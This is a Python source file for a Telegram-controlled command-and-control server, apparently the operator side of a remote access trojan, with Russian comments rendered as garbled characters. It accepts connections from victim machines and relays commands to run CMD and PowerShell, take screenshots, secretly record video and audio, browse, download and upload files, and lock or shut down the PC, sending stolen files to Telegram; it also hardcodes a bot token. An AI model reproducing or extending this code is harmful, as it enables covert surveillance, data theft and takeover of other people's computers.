import telebot
import socket
import threading
import json
import time
import os
from queue import Queue

TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"
SERVER_PORT = 5678
ADMIN_ID = 6330090175  # –í–∞—à ID –≤ Telegram

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
clients = {}  # {device_name: socket}
command_queues = {}  # {device_name: Queue}
active_connections = {}
bot = telebot.TeleBot(TOKEN)

def start_command_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', SERVER_PORT))
        s.listen(5)
        print(f"–°–µ—Ä–≤–µ—Ä —Å–ª—É—à–∞–µ—Ç –ø–æ—Ä—Ç {SERVER_PORT}")
        
        while True:
            conn, addr = s.accept()
            device_name = conn.recv(1024).decode()
            print(f"–ü–æ–¥–∫–ª—é—á–µ–Ω–æ: {device_name} ({addr[0]})")
            
            clients[device_name] = conn
            command_queues[device_name] = Queue()
            active_connections[device_name] = conn
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            client_thread = threading.Thread(
                target=handle_client_connection, 
                args=(device_name, conn),
                daemon=True
            )
            client_thread.start()

def handle_client_connection(device_name, conn):
    while True:
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ—á–µ—Ä–µ–¥—å –∫–æ–º–∞–Ω–¥
            if not command_queues[device_name].empty():
                user_id, command, file_info = command_queues[device_name].get()
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É –∫–ª–∏–µ–Ω—Ç—É
                conn.sendall(json.dumps(command).encode())
                
                # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–∞–π–ª–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
                if command.get('type') in ['download_file', 'video', 'audio']:
                    # –û–∂–∏–¥–∞–µ–º –Ω–∞—á–∞–ª–æ –ø–µ—Ä–µ–¥–∞—á–∏ —Ñ–∞–π–ª–∞
                    response = conn.recv(1024)
                    
                    if response == b"FILE_TRANSFER_START":
                        file_path = file_info['path']
                        with open(file_path, 'wb') as f:
                            while True:
                                data = conn.recv(4096)
                                if not data:
                                    break
                                f.write(data)
                        
                        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                        with open(file_path, 'rb') as f:
                            if command['type'] == 'video':
                                bot.send_video(user_id, f, caption=f"–í–∏–¥–µ–æ —Å {device_name}")
                            elif command['type'] == 'audio':
                                bot.send_audio(user_id, f, caption=f"–ê—É–¥–∏–æ —Å {device_name}")
                            else:
                                bot.send_document(user_id, f, caption=f"–§–∞–π–ª —Å {device_name}")
                        os.remove(file_path)
                        continue
                
                # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—Å—Ç–æ–≤—ã–π –æ—Ç–≤–µ—Ç
                response = conn.recv(4096).decode()
                bot.send_message(user_id, f"üìã –û—Ç–≤–µ—Ç –æ—Ç {device_name}:\n```\n{response}\n```", parse_mode="Markdown")
                
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å {device_name}: {e}")
            del clients[device_name]
            del command_queues[device_name]
            del active_connections[device_name]
            conn.close()
            break

@bot.message_handler(commands=['start', 'help'])
def send_help(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    help_text = """
    üñ•Ô∏è *–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º–∏*
    
    /devices - –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    /help - –°–ø—Ä–∞–≤–∫–∞
    
    ‚öôÔ∏è *–ö–æ–º–∞–Ω–¥—ã (–ø–æ—Å–ª–µ –≤—ã–±–æ—Ä–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞)*:
    /cmd [–∫–æ–º–∞–Ω–¥–∞] - –í—ã–ø–æ–ª–Ω–∏—Ç—å CMD
    /ps [–∫–æ–º–∞–Ω–¥–∞] - PowerShell
    /screenshot - –°–∫—Ä–∏–Ω—à–æ—Ç
    /video [60] - –ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ (60 —Å–µ–∫ –ø–æ —É–º–æ–ª—á.)
    /audio [60] - –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞
    /sysinfo - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
    /lock - –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ü–ö
    /shutdown - –í—ã–∫–ª—é—á–µ–Ω–∏–µ
    /restart - –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞
    /files [–ø—É—Ç—å] - –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
    /download [–ø—É—Ç—å] - –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
    /upload [–ø—É—Ç—å] - –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª
    /zip [–ø–∞–ø–∫–∞] - –ê—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞—Ç—å –ø–∞–ø–∫—É
    """
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['devices'])
def list_devices(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    if not clients:
        bot.send_message(message.chat.id, "‚ùå –£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã")
        return
    
    devices = "\n".join([f"üîπ {device}" for device in clients.keys()])
    bot.send_message(message.chat.id, f"üì± *–ü–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:*\n{devices}", parse_mode="Markdown")
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –≤—ã–±–æ—Ä–∞
    bot.register_next_step_handler(message, select_device)

def select_device(message):
    device_name = message.text.strip()
    if device_name in clients:
        bot.send_message(
            message.chat.id, 
            f"‚úÖ –í—ã–±—Ä–∞–Ω–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {device_name}\n–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–º–∞–Ω–¥—É",
            reply_markup=get_command_keyboard()
        )
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—ã–±–æ—Ä —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        bot.register_next_step_handler_by_chat_id(message.chat.id, handle_command, device_name)
    else:
        bot.send_message(message.chat.id, "‚ùå –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ")
        list_devices(message)

def handle_command(message, device_name):
    if message.from_user.id != ADMIN_ID:
        return
    
    text = message.text.strip()
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –∫–æ–º–∞–Ω–¥—ã
    command = {"type": "cmd"}
    file_info = {}
    
    if text.startswith('/cmd '):
        command = {"type": "cmd", "command": text[5:]}
    
    elif text.startswith('/ps '):
        command = {"type": "powershell", "command": text[4:]}
    
    elif text.startswith('/screenshot'):
        command = {"type": "screenshot"}
    
    elif text.startswith('/video'):
        duration = 60
        if ' ' in text:
            try:
                duration = int(text.split(' ')[1])
            except:
                pass
        command = {"type": "video", "duration": duration}
        file_info = {"path": f"{device_name}_video.mp4"}
    
    elif text.startswith('/audio'):
        duration = 60
        if ' ' in text:
            try:
                duration = int(text.split(' ')[1])
            except:
                pass
        command = {"type": "audio", "duration": duration}
        file_info = {"path": f"{device_name}_audio.wav"}
    
    elif text.startswith('/sysinfo'):
        command = {"type": "sysinfo"}
    
    elif text.startswith('/lock'):
        command = {"type": "lock"}
    
    elif text.startswith('/shutdown'):
        command = {"type": "shutdown"}
    
    elif text.startswith('/restart'):
        command = {"type": "restart"}
    
    elif text.startswith('/files'):
        path = '.' if ' ' not in text else text.split(' ', 1)[1]
        command = {"type": "list_files", "path": path}
    
    elif text.startswith('/download'):
        path = text.split(' ', 1)[1] if ' ' in text else ''
        command = {"type": "download_file", "path": path}
        file_info = {"path": f"{device_name}_{os.path.basename(path)}"}
    
    elif text.startswith('/upload'):
        # –ó–¥–µ—Å—å –Ω—É–∂–Ω–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –ø—Ä–∏–µ–º–∞ —Ñ–∞–π–ª–∞
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏")
        bot.register_next_step_handler(
            message, 
            receive_upload_file, 
            device_name, 
            text.split(' ', 1)[1] if ' ' in text else '.'
        )
        return
    
    elif text.startswith('/zip'):
        folder = text.split(' ', 1)[1] if ' ' in text else '.'
        command = {"type": "zip_folder", "path": folder}
    
    # –î–æ–±–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É –≤ –æ—á–µ—Ä–µ–¥—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    command_queues[device_name].put((message.chat.id, command, file_info))
    bot.send_message(message.chat.id, f"‚åõ –ö–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ {device_name}...")

def receive_upload_file(message, device_name, path):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_name = message.document.file_name
            save_path = f"uploads/{device_name}_{file_name}"
            
            with open(save_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É –Ω–∞ –∑–∞–≥—Ä—É–∑–∫—É —Ñ–∞–π–ª–∞ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
            command = {
                "type": "upload_file",
                "path": os.path.join(path, file_name)
            }
            file_info = {"path": save_path}
            
            command_queues[device_name].put((message.chat.id, command, file_info))
            bot.send_message(message.chat.id, f"‚åõ –§–∞–π–ª –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞ {device_name}...")
        
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")
    else:
        bot.send_message(message.chat.id, "‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª")

def get_command_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('/screenshot', '/video 60', '/audio 60')
    markup.row('/sysinfo', '/lock', '/shutdown')
    markup.row('/files', '/download', '/upload')
    markup.row('/devices', '/help')
    return markup

if __name__ == "__main__":
    # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è –∑–∞–≥—Ä—É–∑–æ–∫
    os.makedirs("uploads", exist_ok=True)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–µ—Ä–≤–µ—Ä –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    server_thread = threading.Thread(target=start_command_server, daemon=True)
    server_thread.start()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    bot.infinity_polling()
